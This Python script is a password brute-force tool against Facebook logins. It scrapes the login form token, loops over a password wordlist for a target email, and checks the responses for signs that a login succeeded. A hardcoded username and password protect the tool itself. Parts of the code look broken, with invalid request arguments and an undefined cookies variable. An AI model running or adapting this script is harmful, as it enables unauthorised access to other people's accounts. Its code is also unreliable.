#Modules
import sys
import os.path
import requests
from header import *
from time import sleep
from colorama import Fore
from banner import Banner
from getpass import getpass
from bs4 import BeautifulSoup


# variables
wordList = "passwords.txt"
minimumPasswordLength = 6
postURL = "https://www.facebook.com/login.php"

# payload ans cookies
PAYLOAD = {}
COOKIES = {}

# function one
def createForm():
    try:
        form = dict()
        data = requests.get(postURL, userAgent=userAgent)
        for i in data.cookies:
            cookies[i.name] = i.value
        data = BeautifulSoup(data.text, "html.parser").form
        if data.input["name"] == "lsd":
            form["lsd"] = data.input["value"]
        return form, cookies
    except Exception as error:
        print(f"An error occurred : {error}")


# function two
def isThisAPassword(email, index, password):
    try:
        global PAYLOAD, COOKIES
        if index % 10 == 0:
            PAYLOAD, COOKIES = createForm()
            PAYLOAD["email"] = email
        PAYLOAD["pass"] = password
        r = requests.post(postURL, data=PAYLOAD, cookies=COOKIES, userAgent=userAgent)
        if (
            "Find Friends" in r.text
            or "security code" in r.text
            or "Two-factor authentication" in r.text
            or "Log Out" in r.text
        ):
            open("temp", "w").write(str(r.content))
            print("\npassword found is: ", password)
            return True
        return False
    except Exception as error:
        print(f"An error occurred : {error}")


if __name__ == "__main__":
    Banner()
# Username & Password
    loginUserPass = ["nurhabib", "123123@@@"]

    # Username and Password Entry
    try:
        loginUsername = input("\nEnter Username: ")
        loginPassword = getpass("Enter Password: ")

        if loginUsername == loginUserPass[0] and loginPassword == loginUserPass[1]:
            print("Login Successfully")
            sleep(1)
            os.system("clear")
        else:
            print("Wrong Login Information, Try Again. ")
            sys.exit()

        if not os.path.isfile(wordList):
            print(f"Password file is not exist: {wordList}")
            sys.exit(0)
        passwordData = open(wordList, "r").read().split("\n")
        print("Password file selected: ", wordList)
        email = input("Enter Email/Username of Target Account : ").strip()
        for index, password in zip(range(passwordData.__len__()), passwordData):
            password = password.strip()
            if len(password) < minimumPasswordLength:
                continue
            print("Trying password [", index, "]: ", password)
            if isThisAPassword(email, index, password):
                break
    except Exception as error:
        print(f"An error occurred : {error}")